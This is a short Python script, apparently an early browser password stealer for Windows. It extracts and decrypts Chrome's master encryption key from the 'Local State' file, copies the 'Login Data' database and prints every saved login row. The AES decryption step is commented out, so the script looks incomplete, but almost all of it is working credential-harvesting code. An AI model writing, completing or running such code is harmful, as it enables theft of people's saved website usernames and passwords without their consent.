import os
import json
import base64
import sqlite3
import win32crypt
#from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]



# get encryption key
encryption_key = get_encryption_key()

# database path
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

filename = "ChromeData.db"

shutil.copyfile(db_path, filename)
# connecting to the database
db = sqlite3.connect(filename)
curser = db.cursor() # object that allow to interact with the database

curser.execute('SELECT * FROM logins')

rows = curser.fetchall()
for row in rows:
    print(row)
#db.commit() # commiting changes 